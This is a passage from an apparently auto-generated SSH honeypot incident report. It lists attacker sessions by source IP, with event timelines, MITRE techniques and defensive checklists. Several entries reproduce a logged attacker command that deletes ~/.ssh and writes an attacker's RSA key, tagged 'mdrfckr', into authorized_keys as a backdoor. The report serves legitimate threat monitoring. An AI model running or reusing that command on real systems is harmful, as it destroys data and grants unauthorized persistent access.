| `2026-06-02 21:27:10` | `cowrie.command.failed` |
| `2026-06-02 21:27:10` | `cowrie.log.closed` |
| `2026-06-02 21:27:10` | `cowrie.session.params` |
| `2026-06-02 21:27:10` | `cowrie.command.input` |
| `2026-06-02 21:27:10` | `cowrie.session.file_download` |
| `2026-06-02 21:27:10` | `cowrie.log.closed` |
| `2026-06-02 21:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa386588fa44

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:27 |
| **Last Seen** | 2026-06-02 21:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:27:12` | `cowrie.session.connect` |
| `2026-06-02 21:27:12` | `cowrie.client.version` |
| `2026-06-02 21:27:12` | `cowrie.client.kex` |
| `2026-06-02 21:27:13` | `cowrie.login.success` |
| `2026-06-02 21:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa487c9cb267

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:28 |
| **Last Seen** | 2026-06-02 21:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:28:56` | `cowrie.session.connect` |
| `2026-06-02 21:28:56` | `cowrie.client.version` |
| `2026-06-02 21:28:56` | `cowrie.client.kex` |
| `2026-06-02 21:28:56` | `cowrie.login.success` |
| `2026-06-02 21:28:57` | `cowrie.session.params` |
| `2026-06-02 21:28:57` | `cowrie.command.input` |
| `2026-06-02 21:28:57` | `cowrie.command.failed` |
| `2026-06-02 21:28:57` | `cowrie.log.closed` |
| `2026-06-02 21:28:57` | `cowrie.session.params` |
| `2026-06-02 21:28:57` | `cowrie.command.input` |
| `2026-06-02 21:28:57` | `cowrie.session.file_download` |
| `2026-06-02 21:28:57` | `cowrie.log.closed` |
| `2026-06-02 21:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a03aea8de9

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:28 |
| **Last Seen** | 2026-06-02 21:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:28:59` | `cowrie.session.connect` |
| `2026-06-02 21:28:59` | `cowrie.client.version` |
| `2026-06-02 21:28:59` | `cowrie.client.kex` |
| `2026-06-02 21:28:59` | `cowrie.login.success` |
| `2026-06-02 21:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a609bb6b4253

| Field | Detail |
|---|---|
| **Source IP** | `118.186.18[.]243` |
| **First Seen** | 2026-06-02 21:29 |
| **Last Seen** | 2026-06-02 21:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:29:57` | `cowrie.session.connect` |
| `2026-06-02 21:29:57` | `cowrie.client.version` |
| `2026-06-02 21:29:57` | `cowrie.client.kex` |
| `2026-06-02 21:29:57` | `cowrie.login.success` |
| `2026-06-02 21:29:58` | `cowrie.session.params` |
| `2026-06-02 21:29:58` | `cowrie.command.input` |
| `2026-06-02 21:29:58` | `cowrie.command.failed` |
| `2026-06-02 21:29:58` | `cowrie.log.closed` |
| `2026-06-02 21:29:58` | `cowrie.session.params` |
| `2026-06-02 21:29:58` | `cowrie.command.input` |
| `2026-06-02 21:29:58` | `cowrie.session.file_download` |
| `2026-06-02 21:29:58` | `cowrie.log.closed` |
| `2026-06-02 21:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.18[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.186.18[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0a2f46f53b3

| Field | Detail |
|---|---|
| **Source IP** | `118.186.18[.]243` |
| **First Seen** | 2026-06-02 21:30 |
| **Last Seen** | 2026-06-02 21:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:30:05` | `cowrie.session.connect` |
| `2026-06-02 21:30:05` | `cowrie.client.version` |
| `2026-06-02 21:30:05` | `cowrie.client.kex` |
| `2026-06-02 21:30:05` | `cowrie.login.success` |
| `2026-06-02 21:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.18[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.186.18[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cec3fd19319

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:32 |
| **Last Seen** | 2026-06-02 21:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:32:08` | `cowrie.session.connect` |
| `2026-06-02 21:32:08` | `cowrie.client.version` |
| `2026-06-02 21:32:08` | `cowrie.client.kex` |
| `2026-06-02 21:32:10` | `cowrie.login.success` |
| `2026-06-02 21:32:10` | `cowrie.session.params` |
| `2026-06-02 21:32:10` | `cowrie.command.input` |
| `2026-06-02 21:32:10` | `cowrie.command.failed` |
| `2026-06-02 21:32:11` | `cowrie.log.closed` |
| `2026-06-02 21:32:11` | `cowrie.session.params` |
| `2026-06-02 21:32:11` | `cowrie.command.input` |
| `2026-06-02 21:32:12` | `cowrie.session.file_download` |
| `2026-06-02 21:32:12` | `cowrie.log.closed` |
| `2026-06-02 21:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba3ee45492d

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:32 |
| **Last Seen** | 2026-06-02 21:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:32:15` | `cowrie.session.connect` |
| `2026-06-02 21:32:15` | `cowrie.client.version` |
| `2026-06-02 21:32:16` | `cowrie.client.kex` |
| `2026-06-02 21:32:17` | `cowrie.login.success` |
| `2026-06-02 21:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e2fae80942

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:33 |
| **Last Seen** | 2026-06-02 21:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:33:15` | `cowrie.session.connect` |
| `2026-06-02 21:33:15` | `cowrie.client.version` |
| `2026-06-02 21:33:15` | `cowrie.client.kex` |
| `2026-06-02 21:33:15` | `cowrie.login.success` |
| `2026-06-02 21:33:16` | `cowrie.session.params` |
| `2026-06-02 21:33:16` | `cowrie.command.input` |
| `2026-06-02 21:33:16` | `cowrie.command.failed` |
| `2026-06-02 21:33:16` | `cowrie.log.closed` |
| `2026-06-02 21:33:16` | `cowrie.session.params` |
| `2026-06-02 21:33:16` | `cowrie.command.input` |
| `2026-06-02 21:33:16` | `cowrie.session.file_download` |
| `2026-06-02 21:33:16` | `cowrie.log.closed` |
| `2026-06-02 21:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfc01894eff1

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:33 |
| **Last Seen** | 2026-06-02 21:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:33:18` | `cowrie.session.connect` |
| `2026-06-02 21:33:18` | `cowrie.client.version` |
| `2026-06-02 21:33:18` | `cowrie.client.kex` |
| `2026-06-02 21:33:18` | `cowrie.login.success` |
| `2026-06-02 21:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7692415bd4ca

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:34 |
| **Last Seen** | 2026-06-02 21:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:34:30` | `cowrie.session.connect` |
| `2026-06-02 21:34:30` | `cowrie.client.version` |
| `2026-06-02 21:34:31` | `cowrie.client.kex` |
| `2026-06-02 21:34:32` | `cowrie.login.success` |
| `2026-06-02 21:34:33` | `cowrie.session.params` |
| `2026-06-02 21:34:33` | `cowrie.command.input` |
| `2026-06-02 21:34:33` | `cowrie.command.failed` |
| `2026-06-02 21:34:33` | `cowrie.log.closed` |
| `2026-06-02 21:34:34` | `cowrie.session.params` |
| `2026-06-02 21:34:34` | `cowrie.command.input` |
| `2026-06-02 21:34:34` | `cowrie.session.file_download` |
| `2026-06-02 21:34:34` | `cowrie.log.closed` |
| `2026-06-02 21:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc2d19ef073

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:34 |
| **Last Seen** | 2026-06-02 21:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:34:38` | `cowrie.session.connect` |
| `2026-06-02 21:34:38` | `cowrie.client.version` |
| `2026-06-02 21:34:38` | `cowrie.client.kex` |
| `2026-06-02 21:34:39` | `cowrie.login.success` |
| `2026-06-02 21:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36d6214f0c99

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:35 |
| **Last Seen** | 2026-06-02 21:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:35:17` | `cowrie.session.connect` |
| `2026-06-02 21:35:17` | `cowrie.client.version` |
| `2026-06-02 21:35:17` | `cowrie.client.kex` |
| `2026-06-02 21:35:18` | `cowrie.login.success` |
| `2026-06-02 21:35:18` | `cowrie.session.params` |
| `2026-06-02 21:35:18` | `cowrie.command.input` |
| `2026-06-02 21:35:18` | `cowrie.command.failed` |
| `2026-06-02 21:35:18` | `cowrie.log.closed` |
| `2026-06-02 21:35:18` | `cowrie.session.params` |
| `2026-06-02 21:35:18` | `cowrie.command.input` |
| `2026-06-02 21:35:19` | `cowrie.session.file_download` |
| `2026-06-02 21:35:19` | `cowrie.log.closed` |
| `2026-06-02 21:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3fefa62afa

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:35 |
| **Last Seen** | 2026-06-02 21:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:35:20` | `cowrie.session.connect` |
| `2026-06-02 21:35:20` | `cowrie.client.version` |
| `2026-06-02 21:35:20` | `cowrie.client.kex` |
| `2026-06-02 21:35:21` | `cowrie.login.success` |
| `2026-06-02 21:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcaf2e13f32b

| Field | Detail |
|---|---|
| **Source IP** | `203.83.234[.]180` |
| **First Seen** | 2026-06-02 21:35 |
| **Last Seen** | 2026-06-02 21:35 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:35:39` | `cowrie.session.connect` |
| `2026-06-02 21:35:39` | `cowrie.client.version` |
| `2026-06-02 21:35:39` | `cowrie.client.kex` |
| `2026-06-02 21:35:40` | `cowrie.login.success` |
| `2026-06-02 21:35:42` | `cowrie.session.params` |
| `2026-06-02 21:35:42` | `cowrie.command.input` |
| `2026-06-02 21:35:42` | `cowrie.command.failed` |
| `2026-06-02 21:35:42` | `cowrie.log.closed` |
| `2026-06-02 21:35:43` | `cowrie.session.params` |
| `2026-06-02 21:35:43` | `cowrie.command.input` |
| `2026-06-02 21:35:44` | `cowrie.session.file_download` |
| `2026-06-02 21:35:44` | `cowrie.log.closed` |
| `2026-06-02 21:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.83.234[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.83.234[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9089da9ec267

| Field | Detail |
|---|---|
| **Source IP** | `203.83.234[.]180` |
| **First Seen** | 2026-06-02 21:35 |
| **Last Seen** | 2026-06-02 21:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:35:51` | `cowrie.session.connect` |
| `2026-06-02 21:35:51` | `cowrie.client.version` |
| `2026-06-02 21:35:52` | `cowrie.client.kex` |
| `2026-06-02 21:35:55` | `cowrie.login.success` |
| `2026-06-02 21:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.83.234[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.83.234[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-017f10cb7266

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:36 |
| **Last Seen** | 2026-06-02 21:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:36:52` | `cowrie.session.connect` |
| `2026-06-02 21:36:52` | `cowrie.client.version` |
| `2026-06-02 21:36:53` | `cowrie.client.kex` |
| `2026-06-02 21:36:54` | `cowrie.login.success` |
| `2026-06-02 21:36:55` | `cowrie.session.params` |
| `2026-06-02 21:36:55` | `cowrie.command.input` |
| `2026-06-02 21:36:55` | `cowrie.command.failed` |
| `2026-06-02 21:36:55` | `cowrie.log.closed` |
| `2026-06-02 21:36:56` | `cowrie.session.params` |
| `2026-06-02 21:36:56` | `cowrie.command.input` |
| `2026-06-02 21:36:56` | `cowrie.session.file_download` |
| `2026-06-02 21:36:56` | `cowrie.log.closed` |
| `2026-06-02 21:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e8741505b9e

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:37 |
| **Last Seen** | 2026-06-02 21:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:37:00` | `cowrie.session.connect` |
| `2026-06-02 21:37:00` | `cowrie.client.version` |
| `2026-06-02 21:37:00` | `cowrie.client.kex` |
| `2026-06-02 21:37:01` | `cowrie.login.success` |
| `2026-06-02 21:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ee0d66c16d3

